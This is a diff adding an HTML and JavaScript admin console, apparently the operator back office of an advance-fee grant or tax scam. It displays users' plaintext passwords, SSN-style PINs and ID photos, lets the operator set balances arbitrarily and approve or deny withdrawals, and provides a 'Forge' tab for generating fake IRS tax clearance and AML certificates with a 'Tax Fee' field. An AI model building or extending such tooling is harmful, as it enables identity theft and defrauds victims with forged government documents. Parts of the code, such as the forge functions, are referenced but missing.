@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TITAN V15 | SUPREME COMMAND</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=JetBrains+Mono:wght@700&display=swap');
+        :root { --sky: #0ea5e9; --rose: #f43f5e; --emerald: #10b981; --amber: #f59e0b; --dark: #020617; }
+        body { background: var(--dark); color: #f1f5f9; font-family: 'Inter', sans-serif; font-size: 12px; overflow-x: hidden; }
+        
+        .glass { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.05); border-radius: 12px; }
+        .pane { display: none; animation: slideUp 0.3s ease-out; }
+        .pane.active { display: block; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+
+        .nav-dock { position: fixed; bottom: 0; width: 100%; max-width: 500px; background: #070a14; display: grid; grid-template-columns: repeat(5, 1fr); padding: 12px 0 25px; border-top: 1px solid #1e293b; z-index: 9000; }
+        .nav-item { text-align: center; color: #475569; font-size: 9px; font-weight: 900; position: relative; }
+        .nav-item.active { color: var(--sky); }
+        .nav-item i { font-size: 20px; display: block; margin-bottom: 4px; }
+        
+        .badge { position: absolute; top: -5px; right: 15px; background: var(--rose); color: white; border-radius: 50%; width: 16px; height: 16px; font-size: 9px; display: flex; align-items: center; justify-content: center; border: 2px solid var(--dark); font-weight: 900; }
+        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 5px; }
+
+        #chat-hub { position: fixed; inset: 0; background: var(--dark); z-index: 10000; display: none; flex-direction: column; }
+        .bubble { max-width: 80%; padding: 10px 14px; border-radius: 18px; margin-bottom: 8px; font-size: 13px; line-height: 1.4; }
+        .b-in { background: #1e293b; align-self: flex-start; border-bottom-left-radius: 2px; }
+        .b-out { background: #0369a1; align-self: flex-end; border-bottom-right-radius: 2px; }
+
+        .irs-border { border: 10px double #1e293b; padding: 30px; background: white; color: black; font-family: 'serif'; position: relative; }
+        #forge-canvas { position: absolute; left: -9999px; width: 800px; }
+    </style>
+</head>
+<body class="flex justify-center">
+
+<div class="w-full max-w-[500px] min-h-screen pb-32">
+    
+    <header class="p-5 sticky top-0 bg-slate-900/95 backdrop-blur-md z-[8000] border-b border-slate-800 flex justify-between items-center">
+        <div>
+            <h1 class="text-lg font-black italic text-sky-500 uppercase">TITAN PRO V15</h1>
+            <div class="flex items-center gap-2">
+                <span class="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></span>
+                <p class="text-[8px] font-black text-slate-500 uppercase tracking-widest">Live Database</p>
+            </div>
+        </div>
+        <div class="flex gap-2">
+             <div class="bg-slate-800 px-3 py-1 rounded-lg border border-slate-700 text-center">
+                <p class="text-[7px] text-slate-500 font-black uppercase">Registered</p>
+                <p id="total-users" class="text-xs font-black text-white">0</p>
+             </div>
+             <button id="logout-btn" class="w-10 h-10 rounded-xl bg-rose-500/10 text-rose-500 border border-rose-500/20"><i class="fas fa-power-off"></i></button>
+        </div>
+    </header>
+
+    <div class="p-4">
+        <div class="relative">
+            <input type="text" id="master-search" placeholder="Search Name, PIN, Email..." class="w-full h-12 bg-slate-800 border border-slate-700 rounded-xl px-12 text-xs font-bold text-white outline-none focus:border-sky-500 transition-all">
+            <i class="fas fa-search absolute left-4 top-4 text-slate-500"></i>
+        </div>
+    </div>
+
+    <main class="px-4 space-y-4">
+        
+        <div id="pane-users" class="pane active space-y-3">
+            <div id="user-grid" class="space-y-3"></div>
+        </div>
+
+        <div id="pane-tasks" class="pane space-y-3">
+            <div class="flex justify-between items-center px-1">
+                <h3 class="text-[9px] font-black text-slate-500 uppercase tracking-widest">Active Requests</h3>
+                <span id="task-count-label" class="bg-amber-500 text-black text-[9px] font-black px-2 py-0.5 rounded">0 PENDING</span>
+            </div>
+            <div id="task-grid" class="space-y-3"></div>
+        </div>
+
+        <div id="pane-messages" class="pane space-y-2">
+            <div id="chat-list" class="space-y-2"></div>
+        </div>
+
+        <div id="pane-ledger" class="pane space-y-2">
+            <h3 class="text-[9px] font-black text-slate-500 uppercase tracking-widest px-1">Global Transaction Log</h3>
+            <div id="ledger-grid" class="space-y-2"></div>
+        </div>
+
+        <div id="pane-forge" class="pane">
+            <div class="glass p-5 space-y-4">
+                <h3 class="text-sky-400 font-black text-[10px] uppercase text-center">IRS Document Generator</h3>
+                <select id="f-user" class="w-full h-11 bg-black border border-slate-700 rounded-xl px-3 text-xs font-bold text-white"></select>
+                <select id="f-type" class="w-full h-11 bg-black border border-slate-700 rounded-xl px-3 text-xs font-bold text-white">
+                    <option value="TAX CLEARANCE CERTIFICATE">Tax Clearance (IRS)</option>
+                    <option value="GRANT DISBURSEMENT">Grant Authorization</option>
+                    <option value="AML COMPLIANCE">AML Federal Clearance</option>
+                </select>
+                <div class="grid grid-cols-2 gap-2">
+                    <input type="text" id="f-amt" placeholder="Amount ($)" class="bg-black border border-slate-700 rounded-xl h-11 px-3 text-xs">
+                    <input type="text" id="f-fee" placeholder="Tax Fee ($)" class="bg-black border border-slate-700 rounded-xl h-11 px-3 text-xs">
+                </div>
+                <button onclick="buildForge()" class="w-full bg-sky-600 h-12 rounded-xl font-black text-[10px] uppercase">Generate Official File</button>
+            </div>
+            <div id="f-output" class="hidden mt-6 text-center">
+                <div id="f-preview" class="bg-white rounded-lg p-1 border-2 border-slate-700 shadow-2xl"></div>
+                <button onclick="downloadDoc()" class="w-full mt-4 bg-emerald-600 h-14 rounded-xl font-black uppercase">Download to Gallery</button>
+            </div>
+        </div>
+
+    </main>
+
+    <nav class="nav-dock">
+        <div class="nav-item active" onclick="switchTab('users', this)"><i class="fas fa-user-shield"></i>Users</div>
+        <div class="nav-item" onclick="switchTab('tasks', this)"><i class="fas fa-bolt"></i>Tasks<span id="badge-t" class="hidden badge">0</span></div>
+        <div class="nav-item" onclick="switchTab('messages', this)"><i class="fas fa-comment-alt"></i>Chat<span id="badge-m" class="hidden badge">0</span></div>
+        <div class="nav-item" onclick="switchTab('ledger', this)"><i class="fas fa-receipt"></i>Ledger</div>
+        <div class="nav-item" onclick="switchTab('forge', this)"><i class="fas fa-file-invoice-dollar"></i>Forge</div>
+    </nav>
+
+    <div id="chat-hub">
+        <div class="p-4 flex justify-between items-center bg-slate-900 border-b border-slate-800">
+            <button onclick="closeChat()" class="text-slate-400"><i class="fas fa-times-circle text-2xl"></i></button>
+            <div class="text-center">
+                <h4 id="chat-target-name" class="font-black text-xs uppercase truncate w-40">...</h4>
+                <p class="text-[7px] text-sky-500 font-bold tracking-widest">SECURE ADMIN CHANNEL</p>
+            </div>
+            <div class="w-8"></div>
+        </div>
+        <div id="chat-feed" class="flex-1 overflow-y-auto p-4 flex flex-col"></div>
+        <div class="p-4 bg-slate-900 border-t border-slate-800">
+            <div id="chat-preview-wrap" class="hidden mb-3"><img id="chat-preview-img" class="w-16 h-16 rounded-lg border-2 border-sky-500 object-cover"></div>
+            <div class="flex gap-2">
+                <label class="w-12 h-12 bg-slate-800 rounded-xl flex items-center justify-center text-slate-400 cursor-pointer">
+                    <i class="fas fa-camera"></i><input type="file" id="chat-file" class="hidden" onchange="previewImg(this)">
+                </label>
+                <input type="text" id="chat-input" class="flex-1 bg-slate-800 h-12 rounded-xl px-4 text-white outline-none text-sm" placeholder="Type response...">
+                <button id="chat-send" class="w-12 h-12 bg-sky-600 rounded-xl text-white"><i class="fas fa-paper-plane"></i></button>
+            </div>
+        </div>
+    </div>
+
+    <div id="viewer" class="fixed inset-0 bg-black/95 z-[20000] hidden flex items-center justify-center p-4" onclick="this.style.display='none'">
+        <img id="viewer-img" class="max-w-full max-h-full rounded shadow-2xl">
+    </div>
+
+    <div id="forge-canvas"></div>
+
+</div>
+
+<script type="module">
+    import { auth, db } from './firebase-config.js';
+    import { collection, onSnapshot, doc, updateDoc, getDoc, arrayUnion, increment, deleteDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+    import { onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+
+    let citizens = [];
+    let activeChatId = null;
+    let pendingImg = null;
+
+    onAuthStateChanged(auth, u => {
+        if(u?.email === "liger4683@gmail.com") startSync();
+        else window.location.href = "index.html";
+    });
+
+    function startSync() {
+        document.getElementById('master-search').oninput = render;
+
+        onSnapshot(collection(db, "users"), snap => {
+            citizens = [];
+            let tasksCount = 0; let msgsCount = 0;
+            snap.forEach(d => {
+                if(d.data().email !== "liger4683@gmail.com") {
+                    const u = { id: d.id, ...d.data() };
+                    citizens.push(u);
+                    
+                    // Count Tasks from all 6+ possible request sources
+                    if(u.kycStatus === 'UNDER_REVIEW') tasksCount++;
+                    if(u.withdrawStatus === 'PENDING') tasksCount++;
+                    if(u.applyStatus === 'PENDING') tasksCount++; // For apply.html
+                    
+                    u.ledger?.forEach(l => { if(l.status === 'PENDING') tasksCount++; });
+                    
+                    // Count Unread Messages
+                    if(u.chatHistory?.length && u.chatHistory[u.chatHistory.length-1].sender === 'USER') msgsCount++;
+                }
+            });
+
+            document.getElementById('total-users').innerText = citizens.length;
+            document.getElementById('badge-t').innerText = tasksCount;
+            document.getElementById('badge-t').classList.toggle('hidden', tasksCount === 0);
+            document.getElementById('task-count-label').innerText = `${tasksCount} PENDING`;
+            document.getElementById('badge-m').innerText = msgsCount;
+            document.getElementById('badge-m').classList.toggle('hidden', msgsCount === 0);
+            
+            document.getElementById('f-user').innerHTML = citizens.map(u => `<option value="${u.id}">${u.fullName}</option>`).join('');
+            
+            render();
+        });
+    }
+
+    function render() {
+        const query = document.getElementById('master-search').value.toLowerCase();
+        const userDiv = document.getElementById('user-grid');
+        const taskDiv = document.getElementById('task-grid');
+        const chatDiv = document.getElementById('chat-list');
+        const ledgerDiv = document.getElementById('ledger-grid');
+
+        userDiv.innerHTML = ""; taskDiv.innerHTML = ""; chatDiv.innerHTML = ""; ledgerDiv.innerHTML = "";
+
+        citizens.forEach(u => {
+            const isMatch = u.fullName.toLowerCase().includes(query) || u.email.toLowerCase().includes(query) || (u.securityPin && u.securityPin.includes(query));
+            if(!isMatch) return;
+
+            // 1. USER LISTING
+            userDiv.innerHTML += `
+            <div class="glass p-4 border-t-2 border-sky-500">
+                <div class="flex justify-between items-start mb-3">
+                    <div class="w-32">
+                        <h4 class="font-black text-white text-[11px] truncate uppercase">${u.fullName}</h4>
+                        <p class="text-[8px] text-slate-500 truncate">${u.email}</p>
+                        <span class="text-[7px] font-black ${u.kycStatus === 'VERIFIED' ? 'text-emerald-500' : 'text-rose-500'} uppercase">
+                            <i class="fas fa-certificate mr-1"></i>${u.kycStatus || 'UNVERIFIED'}
+                        </span>
+                    </div>
+                    <div class="text-right">
+                        <p class="text-[15px] font-black text-emerald-400 mono">$${Number(u.balance || 0).toLocaleString()}</p>
+                        <p class="text-[7px] font-black text-slate-600 uppercase">Available Vault</p>
+                    </div>
+                </div>
+                <div class="grid grid-cols-2 gap-2 mb-3">
+                    <div class="bg-black/50 p-2 rounded-lg border border-slate-800 text-center">
+                        <p class="text-[6px] text-slate-500 font-black">PIN/SSN</p>
+                        <p class="text-[10px] font-black text-amber-500 mono">${u.securityPin || 'N/A'}</p>
+                    </div>
+                    <div class="bg-black/50 p-2 rounded-lg border border-slate-800 text-center">
+                        <p class="text-[6px] text-slate-500 font-black">PASSWORD</p>
+                        <p class="text-[10px] font-black text-amber-500 mono">${u.password || 'N/A'}</p>
+                    </div>
+                </div>
+                <div class="flex gap-2 mb-3">
+                    <input type="number" id="adj-${u.id}" class="flex-1 bg-black rounded-lg h-9 px-3 text-xs font-bold text-white border border-slate-800" placeholder="0.00">
+                    <button onclick="updateBalance('${u.id}', 1)" class="w-9 bg-emerald-500/20 text-emerald-500 rounded-lg border border-emerald-500/20">+</button>
+                    <button onclick="updateBalance('${u.id}', -1)" class="w-9 bg-rose-500/20 text-rose-500 rounded-lg border border-rose-500/20">-</button>
+                </div>
+                <div class="grid grid-cols-2 gap-2">
+                    <button onclick="openChat('${u.id}','${u.fullName}')" class="h-10 bg-sky-600/10 text-sky-400 rounded-xl font-black text-[9px] uppercase border border-sky-600/20">Message</button>
+                    <button onclick="deleteCitizen('${u.id}')" class="h-10 bg-rose-500/10 text-rose-500 rounded-xl font-black text-[9px] uppercase border border-rose-500/20">Purge</button>
+                </div>
+            </div>`;
+
+            // 2. TASK ENGINE (Checks for ALL 6+ Request Types)
+            if(u.kycStatus === 'UNDER_REVIEW') taskDiv.innerHTML += taskTemplate(u.id, u.fullName, 'KYC AUDIT', [u.idFront, u.idBack], 'kyc');
+            if(u.withdrawStatus === 'PENDING') taskDiv.innerHTML += taskTemplate(u.id, u.fullName, `WITHDRAWAL: $${u.withdrawAmount}`, null, 'withdraw');
+            if(u.applyStatus === 'PENDING') taskDiv.innerHTML += taskTemplate(u.id, u.fullName, `GRANT REQUEST: $${u.requestedAmount || '0'}`, null, 'apply');
+            
+            u.ledger?.forEach((l, i) => {
+                if(l.status === 'PENDING') {
+                    taskDiv.innerHTML += taskTemplate(u.id, u.fullName, `${l.type}: $${l.amount}`, l.proof ? [l.proof] : null, 'ledger', i, l);
+                }
+                // LEDGER TAB POPULATION
+                ledgerDiv.innerHTML += `
+                <div class="glass p-3 flex justify-between items-center bg-black/30">
+                    <div>
+                        <p class="text-[10px] font-black uppercase text-white">${u.fullName}</p>
+                        <p class="text-[7px] font-bold text-slate-500 uppercase">${l.type} • ${l.date}</p>
+                    </div>
+                    <div class="text-right">
+                        <p class="text-xs font-black mono ${l.status === 'SUCCESSFUL' ? 'text-emerald-500' : l.status === 'DECLINED' ? 'text-rose-500' : 'text-amber-500'}">$${l.amount}</p>
+                        <p class="text-[6px] font-black uppercase text-slate-600">${l.status}</p>
+                    </div>
+                </div>`;
+            });
+
+            // 3. CHAT LISTING
+            if(u.chatHistory?.length) {
+                const last = u.chatHistory[u.chatHistory.length-1];
+                const isUnread = last.sender === 'USER';
+                chatDiv.innerHTML += `
+                <div onclick="openChat('${u.id}','${u.fullName}')" class="glass p-4 flex justify-between items-center ${isUnread ? 'border-r-4 border-rose-500 bg-rose-500/5' : ''}">
+                    <div class="max-w-[180px]">
+                        <h4 class="font-black text-[10px] uppercase text-white">${isUnread ? '<span class="status-dot bg-rose-500 animate-pulse"></span>' : ''}${u.fullName}</h4>
+                        <p class="text-[9px] text-slate-500 truncate">${last.text || '📷 Attachment'}</p>
+                    </div>
+                    <span class="text-[7px] font-black text-slate-600 uppercase">${new Date(last.time).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</span>
+                </div>`;
+            }
+        });
+    }
+
+    // --- ACTIONS ---
+    window.updateBalance = async (uid, multi) => {
+        const input = document.getElementById(`adj-${uid}`);
+        const val = Number(input.value);
+        if(!val) return;
+        await updateDoc(doc(db, "users", uid), { balance: increment(val * multi) });
+        input.value = "";
+    };
+
+    window.processRequest = async (uid, type, status, idx = null, item = null) => {
+        const note = status === 'DECLINED' ? prompt("Enter Rejection Reason:") : "";
+        if(status === 'DECLINED' && note === null) return;
+
+        const ref = doc(db, "users", uid);
+        const snap = await getDoc(ref);
+        const userData = snap.data();
+
+        if(type === 'kyc') {
+            await updateDoc(ref, { kycStatus: status, kycNote: note || "" });
+        } 
+        else if(type === 'apply') {
+            await updateDoc(ref, { applyStatus: status, denialReason: note || "" });
+        }
+        else if(type === 'withdraw') {
+            if(status === 'DECLINED') {
+                await updateDoc(ref, { 
+                    balance: increment(Number(userData.withdrawAmount)),
+                    withdrawStatus: 'DECLINED',
+                    withdrawNote: note,
+                    withdrawAmount: 0 
+                });
+            } else {
+                await updateDoc(ref, { withdrawStatus: 'SUCCESSFUL' });
+            }
+        } 
+        else if(type === 'ledger') {
+            let ledger = [...userData.ledger];
+            ledger[idx].status = status;
+            if(note) ledger[idx].reason = note;
+            
+            let upData = { ledger: ledger };
+            // Auto-credit balance for incoming funds
+            if(status === 'SUCCESSFUL' && ["DEPOSIT","GRANT","AWARD","BONUS"].includes(item.type)) {
+                upData.balance = increment(Number(item.amount));
+            }
+            await updateDoc(ref, upData);
+        }
+    };
+
+    // --- UI TEMPLATE ---
+    function taskTemplate(uid, name, detail, imgs, type, idx = null, item = null) {
+        const itemStr = item ? JSON.stringify(item).replace(/"/g, '&quot;') : 'null';
+        let imgHtml = "";
+        if(imgs && imgs.length > 0) {
+            imgHtml = `<div class="flex gap-2 my-2">` + imgs.map(i => i ? `<img src="${i}" class="w-14 h-14 object-cover rounded-lg border border-slate-700 shadow-lg" onclick="viewImg('${i}')">` : '').join('') + `</div>`;
+        }
+        
+        return `
+        <div class="glass p-4 border-l-4 border-amber-500">
+            <span class="text-[7px] font-black bg-amber-500 text-black px-2 py-0.5 rounded uppercase">PENDING ${type}</span>
+            <h4 class="mt-2 font-black text-white text-[11px] uppercase">${name}</h4>
+            <p class="text-[9px] text-slate-400 font-bold mt-1">${detail}</p>
+            ${imgHtml}
+            <div class="flex gap-2 mt-4">
+                <button onclick="processRequest('${uid}','${type}','SUCCESSFUL', ${idx}, ${itemStr})" class="flex-1 bg-emerald-600 h-10 rounded-xl font-black text-[9px] text-white uppercase">Approve</button>
+                <button onclick="processRequest('${uid}','${type}','DECLINED', ${idx}, ${itemStr})" class="flex-1 bg-rose-600/10 text-rose-500 h-10 rounded-xl font-black text-[9px] border border-rose-500/20 uppercase">Decline</button>
+            </div>
+        </div>`;
+    }
+
+    // --- CHAT LOGIC ---
+    window.openChat = (uid, name) => {
+        activeChatId = uid;
+        document.getElementById('chat-target-name').innerText = name;
+        document.getElementById('chat-hub').style.display = 'flex';
+        onSnapshot(doc(db, "users", uid), s => {
+            const hist = s.data().chatHistory || [];
+            document.getElementById('chat-feed').innerHTML = hist.map(m => `
+                <div class="bubble ${m.sender === 'ADMIN' ? 'b-out' : 'b-in'}">
+                    ${m.image ? `<img src="${m.image}" class="w-full rounded-xl mb-2" onclick="viewImg('${m.image}')">` : ''}
+                    <p class="font-bold text-white">${m.text || ''}</p>
+                    <p class="text-[6px] opacity-40 text-right mt-1 font-black uppercase">${new Date(m.time).toLocaleTimeString()}</p>
+                </div>`).join('');
+            const feed = document.getElementById('chat-feed');
+            feed.scrollTop = feed.scrollHeight;
+        });
+    };
+
+    window.closeChat = () => document.getElementById('chat-hub').style.display = 'none';
+    window.previewImg = (input) => {
+        const reader = new FileReader();
+        reader.onload = e => {
+            pendingImg = e.target.result;
+            document.getElementById('chat-preview-img').src = pendingImg;
+            document.getElementById('chat-preview-wrap').classList.remove('hidden');
+        };
+        reader.readAsDataURL(input.files[0]);
+    };
+
+    document.getElementById('chat-send').onclick = async () => {
+        const inp = document.getElementById('chat-input');
+        if(!inp.value && !pendingImg) return;
+        await updateDoc(doc(db, "users", activeChatId), {
+            chatHistory: arrayUnion({
+                sender: "ADMIN",
+                text: inp.value,
+                image: pendingImg,
+                time: new Date().toISOString()
+            })
+        });
+        inp.value = ""; pendingImg = null;
+        document.getElementById('chat-preview-wrap').classList.add('hidden');
+    };
+
+    window.switchTab = (id, el) => {
+        document.querySelectorAll('.pane').forEach(p => p.classList.remove('active'));
+        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+        document.getElementById('pane-'+id).classList.add('active');
+        el.classList.add('active');
+        window.scrollTo(0,0);
+    };
+
+    window.viewImg = (src) => { document.getElementById('viewer-img').src = src; document.getElementById('viewer').style.display = 'flex'; };
+    window.deleteCitizen = async (id) => { if(confirm("WIPE RECORD FOREVER?")) await deleteDoc(doc(db, "users", id)); };
+    document.getElementById('logout-btn').onclick = () => signOut(auth);
+</script>
+</body>
+</html>
